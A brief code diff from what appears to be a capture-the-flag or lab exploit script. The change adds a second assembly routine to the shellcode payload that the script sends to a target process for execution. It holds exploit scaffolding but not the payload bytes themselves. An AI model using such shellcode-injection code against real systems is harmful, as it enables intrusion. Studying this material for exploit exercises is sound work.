@@ -413,7 +413,7 @@ if __name__ == '__main__':
 
     # [second send] -> input the asm we want to execute and it will be store into the start of codeint
     # send_line_2 = task_2_asm_byte() + task_3_asm_byte() + exit_0_asm_byte()
-    send_line_2 = task_3_asm_byte() + exit_0_asm_byte()
+    send_line_2 = task_2_asm_byte() + task_3_asm_byte() + exit_0_asm_byte()
 
     print("send_line_2 to read: ", send_line_2)
     r.send(send_line_2)
